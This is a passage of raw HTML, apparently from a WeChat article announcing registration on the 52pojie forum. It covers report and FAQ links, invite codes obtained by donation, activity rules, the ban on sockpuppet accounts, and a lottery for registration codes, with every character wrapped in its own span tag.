initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">子</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">诉</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">诉</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">f</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">u</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">站</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">文</span><span style="display: inline-block; text-indent: initial;">档</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><strong><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">般</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">里</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">找</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">！</span></strong><strong><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">?</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">=</span><span style="display: inline-block; text-indent: initial;">f</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">q</span></strong></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">相</span><span style="display: inline-block; text-indent: initial;">关</span><span style="display: inline-block; text-indent: initial;">说</span><span style="display: inline-block; text-indent: initial;">明</span></h2><ul class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li><p><span style="color: rgb(255, 0, 0); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">捐</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">取</span><span style="background-color: rgb(255, 255, 0);"><span style="display: inline-block; text-indent: initial;">邀</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">说</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">赠</span><span style="display: inline-block; text-indent: initial;">送</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">币</span><span style="display: inline-block; text-indent: initial;">价</span><span style="display: inline-block; text-indent: initial;">值</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">元</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">而</span><span style="display: inline-block; text-indent: initial;">且</span><span style="display: inline-block; text-indent: initial;">免</span><span style="display: inline-block; text-indent: initial;">受</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">跃</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">风</span><span style="display: inline-block; text-indent: initial;">险</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">滴</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">【</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">总</span><span style="display: inline-block; text-indent: initial;">版</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">】</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">[</span><span style="display: inline-block; text-indent: initial;">让</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">速</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">庭</span><span style="display: inline-block; text-indent: initial;">]</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">样</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li><li><p><span style="background-color: rgb(255, 255, 0); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">并</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">意</span><span style="display: inline-block; text-indent: initial;">味</span><span style="display: inline-block; text-indent: initial;">着</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">已</span><span style="display: inline-block; text-indent: initial;">经</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">仅</span><span style="display: inline-block; text-indent: initial;">仅</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">第</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">坚</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">登</span><span style="display: inline-block; text-indent: initial;">录</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">保</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">跃</span><span style="display: inline-block; text-indent: initial;">才</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">保</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">庭</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">每</span><span style="display: inline-block; text-indent: initial;">次</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">只</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">完</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">就</span><span style="display: inline-block; text-indent: initial;">完</span><span style="display: inline-block; text-indent: initial;">事</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">续</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">坚</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">登</span><span style="display: inline-block; text-indent: initial;">陆</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">导</span><span style="display: inline-block; text-indent: initial;">致</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">最</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">希</span><span style="display: inline-block; text-indent: initial;">望</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">禁</span><span style="display: inline-block; text-indent: initial;">止</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">甲</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">禁</span><span style="display: inline-block; text-indent: initial;">止</span><span style="display: inline-block; text-indent: initial;">贩</span><span style="display: inline-block; text-indent: initial;">卖</span><span style="display: inline-block; text-indent: initial;">倒</span><span style="display: inline-block; text-indent: initial;">卖</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">经</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">即</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">删</span><span style="display: inline-block; text-indent: initial;">除</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">处</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">珍</span><span style="display: inline-block; text-indent: initial;">惜</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">宝</span><span style="display: inline-block; text-indent: initial;">贵</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">小</span><span style="display: inline-block; text-indent: initial;">小</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">给</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">欢</span><span style="display: inline-block; text-indent: initial;">声</span><span style="display: inline-block; text-indent: initial;">笑</span><span style="display: inline-block; text-indent: initial;">语</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">法</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">金</span><span style="display: inline-block; text-indent: initial;">钱</span><span style="display: inline-block; text-indent: initial;">衡</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">祝</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">访</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">情</span><span style="display: inline-block; text-indent: initial;">愉</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li></ul><p><br /></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">抽</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">（</span><span style="display: inline-block; text-indent: initial;">抽</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">）</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">公</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">台</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">“313</span><span style="display: inline-block; text-indent: initial;">福</span><span style="display: inline-block; text-indent: initial;">利</span><span style="display: inline-block; text-indent: initial;">”</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">取</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">法</span><span style="display: inline-block; text-indent: initial;">，</span><strong style="letter-spacing: 0.544px;"><span style="display: inline-block; text-indent: initial;">周四3</span></strong><span style="display: inline-block; text-indent: initial;">月7</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">送</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">币，防止错过开放注册，强烈建议设置“星标”</span><span style="display: inline-block; text-indent: initial;">。</span></strong></span></p><p><span style="color: rgb(0, 82, 255); font-size: 18px;"><strong><br /></strong></span></p><p><em><span style="color: rgb(136, 136, 136); font-size: 14px;"></span></em><em style="letter-spacing: 0.544px;"><span style="color: rgb(136, 136, 136); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">上</span><span style="display: inline-block; text-indent: initial;">次</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">动</span><span style="display: inline-block; text-indent: initial;">居</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">位</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">？</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">位</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">按</span><span style="display: inline-block; text-indent: initial;">照</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">求</span><span style="display: inline-block; text-indent: initial;">提</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">截</span><span style="display: inline-block; text-indent: initial;">图</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">也</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">奖</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">所</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">则</span><span style="display: inline-block; text-indent: 